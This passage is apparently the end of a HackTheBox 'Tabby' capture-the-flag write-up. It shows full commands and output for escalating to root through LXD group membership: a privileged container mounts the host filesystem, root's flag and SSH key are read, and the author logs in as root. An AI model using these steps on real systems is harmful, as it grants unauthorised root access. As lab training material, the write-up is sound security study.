<span class="o">(</span>8/19<span class="o">)</span> Installing ca-certificates-bundle <span class="o">(</span>20191127-r4<span class="o">)</span>
<span class="o">(</span>9/19<span class="o">)</span> Installing libtls-standalone <span class="o">(</span>2.9.1-r1<span class="o">)</span>
<span class="o">(</span>10/19<span class="o">)</span> Installing ssl_client <span class="o">(</span>1.31.1-r19<span class="o">)</span>
<span class="o">(</span>11/19<span class="o">)</span> Installing zlib <span class="o">(</span>1.2.11-r3<span class="o">)</span>
<span class="o">(</span>12/19<span class="o">)</span> Installing apk-tools <span class="o">(</span>2.10.5-r1<span class="o">)</span>
<span class="o">(</span>13/19<span class="o">)</span> Installing busybox-suid <span class="o">(</span>1.31.1-r19<span class="o">)</span>
<span class="o">(</span>14/19<span class="o">)</span> Installing busybox-initscripts <span class="o">(</span>3.2-r2<span class="o">)</span>
Executing busybox-initscripts-3.2-r2.post-install
<span class="o">(</span>15/19<span class="o">)</span> Installing scanelf <span class="o">(</span>1.2.6-r0<span class="o">)</span>
<span class="o">(</span>16/19<span class="o">)</span> Installing musl-utils <span class="o">(</span>1.1.24-r9<span class="o">)</span>
<span class="o">(</span>17/19<span class="o">)</span> Installing libc-utils <span class="o">(</span>0.7.2-r3<span class="o">)</span>
<span class="o">(</span>18/19<span class="o">)</span> Installing alpine-keys <span class="o">(</span>2.2-r0<span class="o">)</span>
<span class="o">(</span>19/19<span class="o">)</span> Installing alpine-base <span class="o">(</span>3.12.0-r0<span class="o">)</span>
Executing busybox-1.31.1-r19.trigger
OK: 8 MiB <span class="k">in </span>19 packages
</pre></table></code></div></div><p>Now we got a new file here</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>➜  lxd-alpine-builder git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls</span> <span class="nt">-la</span>
total 3172
drwxr-xr-x 3 root root    4096 Jun 23 04:39 <span class="nb">.</span>
drwxr-xr-x 5 root root    4096 Jun 23 04:02 ..
<span class="nt">-rw-r--r--</span> 1 root root 3190814 Jun 23 04:39 alpine-v3.12-x86_64-20200623_0439.tar.gz
</pre></table></code></div></div><blockquote><p>uploading it to the machine</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>ash@tabby:~/alpine<span class="nv">$ </span>wget http://10.10.14.79/alpine-v3.12-x86_64-20200623_0439.tar.gz
&lt;0.10.14.79/alpine-v3.12-x86_64-20200623_0439.tar.gz
<span class="nt">--2020-06-23</span> 08:56:17--  http://10.10.14.79/alpine-v3.12-x86_64-20200623_0439.tar.gz
Connecting to 10.10.14.79:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3190814 <span class="o">(</span>3.0M<span class="o">)</span> <span class="o">[</span>application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20200623_0439.tar.gz’

alpine-v3.12-x86_64 100%[<span class="o">===================&gt;]</span>   3.04M   847KB/s    <span class="k">in </span>4.8s    

2020-06-23 08:56:22 <span class="o">(</span>650 KB/s<span class="o">)</span> - ‘alpine-v3.12-x86_64-20200623_0439.tar.gz’ saved <span class="o">[</span>3190814/3190814]
</pre></table></code></div></div><h2 id="attacking-lxd">Attacking lxd</h2><blockquote><p>initializing lxd</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span>lxd init
lxd init
2020/06/23 09:07:52 usbid: failed to load: open /usr/share/misc/usb.ids: no such file or directory
Would you like to use LXD clustering? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no]: 

Do you want to configure a new storage pool? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span><span class="nb">yes</span><span class="o">]</span>: 

Name of the new storage pool <span class="o">[</span><span class="nv">default</span><span class="o">=</span>default]: 

Name of the storage backend to use <span class="o">(</span>btrfs, <span class="nb">dir</span>, lvm, ceph<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>btrfs]: 

Create a new BTRFS pool? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span><span class="nb">yes</span><span class="o">]</span>: 

Would you like to use an existing block device? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no]: 

Size <span class="k">in </span>GB of the new loop device <span class="o">(</span>1GB minimum<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>15GB]: 

Would you like to connect to a MAAS server? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no]: 

Would you like to create a new <span class="nb">local </span>network bridge? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span><span class="nb">yes</span><span class="o">]</span>: 

What should the new bridge be called? <span class="o">[</span><span class="nv">default</span><span class="o">=</span>lxdbr0]: 

What IPv4 address should be used? <span class="o">(</span>CIDR subnet notation, “auto” or “none”<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>auto]: 

What IPv6 address should be used? <span class="o">(</span>CIDR subnet notation, “auto” or “none”<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>auto]: 

Would you like LXD to be available over the network? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no]: 

Would you like stale cached images to be updated automatically? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span><span class="nb">yes</span><span class="o">]</span> 

Would you like a YAML <span class="s2">"lxd init"</span> preseed to be printed? <span class="o">(</span><span class="nb">yes</span>/no<span class="o">)</span> <span class="o">[</span><span class="nv">default</span><span class="o">=</span>no]:
</pre></table></code></div></div><blockquote><p>importing image</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>
ash@tabby:~<span class="nv">$ </span>lxc image import ./alpine-v3.12-x86_64-20200623_0439.tar.gz <span class="nt">--alias</span> myimage
&lt;e-v3.12-x86_64-20200623_0439.tar.gz <span class="nt">--alias</span> myimage
To start your first instance, try: lxc launch ubuntu:18.04
</pre></table></code></div></div><blockquote><p>list available images</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span>lxc image list
lxc image list
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| myimage | b8fe64b50198 | no     | alpine v3.12 <span class="o">(</span>20200623_04:39<span class="o">)</span> | x86_64       | CONTAINER | 3.04MB | Jun 23, 2020 at 9:09am <span class="o">(</span>UTC<span class="o">)</span> |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
</pre></table></code></div></div><blockquote><p>mounting /root to /mnt/root dir</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>ash@tabby:~<span class="nv">$ </span>lxc init myimage ignite <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
</span>lxc init myimage ignite <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
</span>Creating ignite
ash@tabby:~<span class="nv">$ </span>lxc config device add ignite mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
&lt;ydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
</span>Device mydevice added to ignite
ash@tabby:~<span class="nv">$ </span>lxc start ignite
lxc start ignite
ash@tabby:~<span class="nv">$ </span>lxc <span class="nb">exec </span>ignite /bin/sh

lxc <span class="nb">exec </span>ignite /bin/sh
~ <span class="c"># </span>
</pre></table></code></div></div><h1 id="got-roottxt">Got root.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>~ <span class="c"># cd /mnt/root/root</span>
<span class="nb">cd</span> /mnt/root/root
/mnt/root/root <span class="c"># cat root.txt</span>
<span class="nb">cat </span>root.txt
64f93391581f9911f94fdb381a9e0a01
</pre></table></code></div></div><h1 id="login-as-root">Login as root</h1><p>I got the private ssh keys for root and ican use them to login</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>/mnt/root/root/.ssh <span class="c"># ls -la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 20
drwx------    2 root     root          4096 Jun 16 14:00 <span class="nb">.</span>
drwx------    6 root     root          4096 Jun 16 13:59 ..
<span class="nt">-rw-------</span>    1 root     root           564 Jun 16 14:10 authorized_keys
<span class="nt">-rw-------</span>    1 root     root          2602 Jun 16 14:00 id_rsa
<span class="nt">-rw-r--r--</span>    1 root     root           564 Jun 16 14:00 id_rsa.pub
</pre></table></code></div></div><blockquote><p>ssh to root</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>➜  tabby ssh <span class="nt">-i</span> id_rsa-root root@tabby.htb
Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-31-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Tue 23 Jun 2020 09:12:56 AM UTC

  System load:             0.13
  Usage of /:              34.4% of 15.68GB
  Memory usage:            40%
  Swap usage:              0%
  Processes:               230
  Users logged <span class="k">in</span>:         0
  IPv4 address <span class="k">for </span>ens192: 10.10.10.194
  IPv4 address <span class="k">for </span>lxdbr0: 10.215.79.1
  IPv6 address <span class="k">for </span>lxdbr0: fd42:a08f:e3de:a791::1

 <span class="k">*</span> MicroK8s gets a native Windows installer and command-line integration.

     https://ubuntu.com/blog/microk8s-installers-windows-and-macos

0 updates can be installed immediately.
0 of these updates are security updates.


Last login: Wed Jun 17 21:58:30 2020 from 10.10.14.2
root@tabby:~#
</pre></table></code></div></div><h1 id="donations">Donations</h1><p><strong>If u like My Content.Support a college going Student who is collecting money to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> <a href="https://0xprashant.github.io/tabs/donation/" target="_blank">Donation for OSCP</a></strong></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Url<tbody><tr><td>tomcat docs<td><a href="http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html" target="_blank">http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html</a><tr><td>Deploy a script<td><a href="https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script" target="_blank">https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script</a><tr><td>Deploy a script<td><a href="http://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Supported_Manager_Commands" target="_blank">http://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Supported_Manager_Commands</a><tr><td>Deploy a script<td><a href="https://serverfault.com/questions/727992/how-to-deploy-a-tomcat-application-with-manager-url-api-when-using-custom-contex" target="_blank">https://serverfault.com/questions/727992/how-to-deploy-a-tomcat-application-with-manager-url-api-when-using-custom-contex</a><tr><td>lxd privilege escalation<td><a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank">https://www.hackingarticles.in/lxd-privilege-escalation/</a><tr><td>lxd privilege escalation<td><a href="https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/" target="_blank">https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/</a><tr><td>lxd privilege escalation<td><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04</a><tr><td>lxd-alpine-repo<td><a href="https://github.com/saghul/lxd-alpine-builder" target="_blank">https://github.com/saghul/lxd-alpine-builder</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tomcat-deploy/" class="post-tag no-text-decoration" >tomcat-deploy</a> <a href="/tags/zip2john/" class="post-tag no-text-decoration" >zip2john</a> <a href="/tags/curl-api/" class="post-tag no-text-decoration" >curl-api</a> <a href="/tags/metasploit/" class="post-tag no-text-decoration" >metasploit</a> <a href="/tags/java-payload/" class="post-tag no-text-decoration" >java-payload</a> <a href="/tags/lxd-group/" class="post-tag no-text-decoration" >lxd-group</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Tabby writeup - 0xPrashant&url=http://localhost:4000/posts/htb-tabby/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Tabby writeup - 0xPrashant&u=http://localhost:4000/posts/htb-tabby/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Tabby writeup - 0xPrashant&url=http://localhost:4000/posts/htb-tabby/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-blunder/"><div class="card-body"> <span class="timeago small" > May 30 <i class="unloaded">2020-05-30T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blunder writeup</h3><div class="text-muted small"><p> Introduction@Blunder:~$ Column Details Name Blunder IP 10.10.10.191 Points 20 Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blackfield/"><div class="card-body"> <span class="timeago small" > Jun 9 <i class="unloaded">2020-06-09T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blackfield writeup</h3><div class="text-muted small"><p> Introduction@Blackfield:~$ Column Details Name Blackfield IP 10.10.10.192 Points 40 Os ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-fuse/" class="btn btn-outline-primary"><p>Hackthebox Fuse writeup</p></a> <a href="/posts/htb-sneakymailer/" class="btn btn-outline-primary"><p>Hackthebox Sneakymailer writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-tabby/'; this.page.identifier = '/posts/htb-tabby/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
